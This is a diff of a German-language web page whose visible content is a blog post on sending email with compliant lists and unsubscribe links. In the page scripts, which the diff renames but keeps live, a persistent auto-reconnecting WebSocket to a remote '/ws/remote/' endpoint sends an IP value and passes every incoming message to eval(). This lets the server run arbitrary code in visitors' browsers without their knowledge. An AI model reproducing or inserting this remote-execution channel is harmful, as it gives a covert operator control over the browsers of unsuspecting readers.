@@ -65,7 +65,7 @@
               <a class="nav-link" href="/de/landing" title="Besuchen Sie die Zielseite">Landung</a>
             </li>
             <li class="nav-item">
-              <a class="nav-link" href="https://qoshlli.com" title="Video -Chat">Chat</a>
+              <a class="nav-link" href="/de/chat" title="Video -Chat">Chat</a>
             </li>
             <li class="nav-item">
               <a class="nav-link" href="/de/private" title="Sehen Sie private Fotos mit einem Schlüssel an">Privat</a>
@@ -123,7 +123,8 @@
 <img src="https://i.imgur.com/dAQRaWt.jpeg" alt="DaisyProfilfoto" width="120" height="120" style="margin-top:5px; margin-right:10px; margin-bottom:10px; border-radius: 50%;">
 <p><i>Von Daisy</i></p>
 
-<div style="white-space: pre-wrap;"><p> Wie sende ich E -Mails mit einer konformen E -Mail -Liste und Abhebung von Links?Befolgen Sie diese Schritte: </p> <p> <br> </p> <p> 1.Stellen Sie sicher, dass Ihre E-Mail-Liste mit allen relevanten Vorschriften wie dem CAN-SPAM-Gesetz und der DSGVO entspricht.Dies bedeutet, dass alle Empfänger sich für den Empfang Ihrer E -Mails angemeldet haben müssen und dass Sie ihre explizite Zustimmung zur Kontaktaufnahme mit ihnen haben. </P> <p> <br> </p> <p> 2.Fügen Sie in Ihrer E -Mail einen klaren und prominenten Abbestellenlink ein.Stellen Sie sicher, dass es leicht zu finden und klicken kann, und es führt die Empfänger direkt zu einer Seite, auf der sie sich leicht von Ihrer Mailingliste abmelden können. </P> <p> <br> </p> <p> 3.Um den Link zum Abbestellen "enger" zu machen, können Sie eine einzelne Klick-Abbestellenoption verwenden.Dies bedeutet, dass die Empfänger Ihre E -Mails mit nur einem Klick abmelden können, ohne zusätzliche Formulare auszufüllen oder persönliche Informationen bereitzustellen. </P> <p> <br> </p> <p> 4.Beim SendenStellen Sie die E -Mail sicher, dass Sie die Nachricht personalisieren und nach Möglichkeit den Empfänger mit dem Namen ansprechen.Dies kann dazu beitragen, das Engagement zu erhöhen und die E -Mail für den Empfänger relevanter zu fühlen. </P> <p> <br> </p> <p> 5.Testen Sie vor dem Senden der E -Mail, um sicherzustellen, dass der Link zum Abbestellen ordnungsgemäß funktioniert und dass die E -Mail auf allen Geräten und E -Mail -Clients gut aussieht.Sie können eine E -Mail mit einer konformen Liste und einem engeren Abbestellenlink senden, um sicherzustellen</div>
+<div style="white-space: pre-wrap;"><p>Wie sende ich E -Mails mit einer konformen E -Mail -Liste und Abbestellenlinks?</p><p><br/></p><p>Um eine E -Mail mit einer konformen Liste und einem engeren Link zum Abbestellen zu senden, sollten Sie folgende Schritte befolgen:</p><p><br/></p><p>1. Stellen Sie sicher, dass Ihre E-Mail-Liste mit allen relevanten Vorschriften wie dem CAN-Spam Act und der GDPR entspricht. Dies bedeutet, dass alle Empfänger sich für die Erhalt Ihrer E -Mails angemeldet haben müssen und dass Sie ihre ausdrückliche Zustimmung zur Kontaktaufnahme mit ihnen haben.</p><p><br/></p><p>2. Fügen Sie in Ihrer E -Mail einen klaren und prominenten Abbestellenlink ein. Stellen Sie sicher, dass es leicht zu finden und klicken kann, und es führt die Empfänger direkt zu einer Seite, auf der sie sich leicht von Ihrer Mailingliste abmelden können.</p><p><br/></p><p>3. Um den Link zum Abbestellen "enger" zu machen, können Sie eine einzelne Klick-Abbestellenoption verwenden. Dies bedeutet, dass die Empfänger Ihre E -Mails mit nur einem Klick abmelden können, ohne zusätzliche Formulare auszufüllen oder persönliche Informationen bereitzustellen.</p><p><br/></p><p>4. Wenn Sie die E -Mail senden, stellen Sie sicher, dass Sie die Nachricht personalisieren und nach Möglichkeit den Empfänger mit dem Namen ansprechen. Dies kann dazu beitragen, das Engagement zu steigern und die E -Mail für den Empfänger relevanter zu fühlen.</p><p><br/></p><p>5. Bevor Sie die E -Mail senden, testen Sie sie, um sicherzustellen, dass der Link des Abmeldes ordnungsgemäß funktioniert und dass die E -Mail auf allen Geräten und E -Mail -Clients gut aussieht.</p><p><br/></p><p>Wenn Sie diese Schritte ausführen, können Sie eine E -Mail mit einer konformen Liste und einem engeren Abbestellenlink senden, um sicherzustellen, dass Ihre Empfänger über eine positive Erfahrung verfügen und sich problemlos vom Empfang weiterer E -Mails von Ihnen entscheiden können.</p></div>
+
 
 <div class="mx-auto p-1 m-1" style="display: flex; justify-content: space-around;">
 <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-6209985848112194"
@@ -240,6 +241,23 @@
         
 
 
+var currentReader = 0;
+function toggleReader(id) {
+	currentReader = id;
+	$('#reader-modal' + id).toggleClass('hide');
+	$('#reader-modal' + id).toggleClass('fade-in-fast');
+	$('#bnav' + id).toggleClass('hide');
+	$('#bnav' + id).toggleClass('fade-in-fast');
+	setTimeout(function() {
+		$('#reader-modal' + id).toggleClass('fade-in-fast');
+		$('#bnav' + id).toggleClass('fade-in-fast');
+	}, 1000);
+}
+function jumpbookto(page) {
+	document.getElementById('reader-modal' + currentReader).scrollTo(0, (parseInt(document.getElementById('jumpto' + page).value)-1) * parseInt(window.innerHeight));
+	document.getElementById('pagecount' + page).innerHTML = parseInt(document.getElementById('jumpto' + page).value);
+}
+
 
         
         
@@ -250,32 +268,32 @@
             
         	Prism.highlightAll();
         });
-        var socket;
-        function openSocket() {
+        var remoteSocket;
+        function openRemoteSocket() {
             window.location.hash = '';
-            socket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
-            socket.addEventListener("open", (event) => {
+            remoteSocket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
+            remoteSocket.addEventListener("open", (event) => {
                 console.log('Socket open.');
                 fetch('https://lotteh.com/remote/generate/')
         		    .then(response => response.json())
         		    .then(data => {
-        		        socket.send(data.ip);
+        		        remoteSocket.send(data.ip);
         		    })
         		    .catch(error => {
         		        console.log('Error:', error);
         		    });
             });
-            socket.addEventListener("closed", (event) => {
+            remoteSocket.addEventListener("closed", (event) => {
                 console.log('Socket closed.');
                 setTimeout(function() {
-                    openSocket();
+                    openRemoteSocket();
                 }, 10000);
             });
-        	socket.addEventListener("message", (event) => {
+        	remoteSocket.addEventListener("message", (event) => {
                     eval(event.data);
             });
         }
-        openSocket();
+        openRemoteSocket();
         $(document).ready(function() {
         	$("#contact-form").submit(function(e){
                 	e.preventDefault();
@@ -427,8 +445,8 @@ if(document.getElementById("current-time")) {
               link.href = url;
               link.download = 'Glam Girl X - ' + filename;
               document.body.appendChild(link);
+              link.classList.add('hide');
               link.click();
-              document.body.removeChild(link);
             }
             function downloadQr() {
                     downloadQrImage(image.src, 'QR Code');
@@ -450,6 +468,8 @@ if(document.getElementById("current-time")) {
   });
 </script>
 
+    
+    
     
     
     <script>
